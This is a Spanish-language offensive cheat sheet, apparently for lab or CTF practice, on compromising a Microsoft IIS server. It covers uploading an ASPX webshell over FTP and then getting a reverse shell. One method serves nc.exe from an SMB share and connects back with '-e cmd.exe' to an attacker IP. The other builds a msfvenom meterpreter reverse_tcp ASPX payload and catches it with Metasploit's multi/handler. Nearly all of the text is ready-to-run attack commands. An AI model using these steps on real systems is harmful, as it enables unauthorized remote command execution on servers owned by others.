# Webshell ASPX en Servidor Microsoft IIS

IIS (Internet Information Services) ejecuta paginas ASPX. Si podemos subir un archivo ASPX, podemos ejecutar comandos.

## Encontrar Webshells ASPX Preinstaladas

```bash
find / -name cmdasp.aspx 2>/dev/null
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

```bash
locate .aspx
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx .
```

## Subir la Webshell via FTP

```bash
put cmdasp.aspx
```

## Ejecutar Comandos y Obtener Reverse Shell

Buscamos netcat para Windows:

```bash
find / -name nc.exe 2>/dev/null
cp /usr/share/windows-resources/binaries/nc.exe .
```

```bash
locate nc.exe
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .
```

Compartimos nc.exe via SMB y nos ponemos en escucha:

```bash
impacket-smbserver recurso $(pwd) -smb2support

nc -nlvp <puerto>
```

Desde el navegador (en la webshell ASPX), ejecutamos:

```
\\<IP_atacante>\recurso\nc.exe -e cmd.exe <IP_atacante> <puerto>
```

## Opcion 2: Payload ASPX Directo

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=4444 -f aspx -o shell.aspx
```

Subir via FTP, configurar Multi/Handler en Metasploit y acceder al archivo desde el navegador.

```bash
msfconsole
use multi/handler
set LHOST <IP_atacante>
set LPORT <puerto>
set PAYLOAD windows/meterpreter/reverse_tcp
run
```
